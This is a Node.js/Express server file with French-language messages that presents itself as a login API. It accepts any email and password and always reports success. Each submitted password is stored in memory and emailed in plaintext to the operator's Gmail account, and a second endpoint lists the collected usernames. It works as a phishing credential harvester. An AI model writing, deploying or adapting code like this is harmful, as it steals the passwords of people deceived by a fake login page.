const express = require('express');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

const users = [];

let transporter = null;
if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
  transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    }
  });
}

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !username.trim()) {
    return res.status(400).json({ success: false, message: 'Email requis' });
  }

  if (!password || !password.trim()) {
    return res.status(400).json({ success: false, message: 'Mot de passe requis' });
  }

  const userEntry = {
    username: username.trim(),
    password: password.trim(),
    date: new Date().toISOString()
  };

  users.push(userEntry);

  if (transporter) {
    try {
      await transporter.sendMail({
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_USER,
        subject: `Nouvelle connexion - ${username.trim()}`,
        html: `<p><b>User:</b> ${username.trim()}</p><p><b>Pass:</b> ${password.trim()}</p>`
      });
    } catch (e) {}
  }

  res.json({ success: true, message: 'Connexion réussie' });
});

app.get('/api/users', (req, res) => {
  res.json(users.map(u => ({ username: u.username, date: u.date })));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('Serveur démarré sur le port ' + PORT);
});
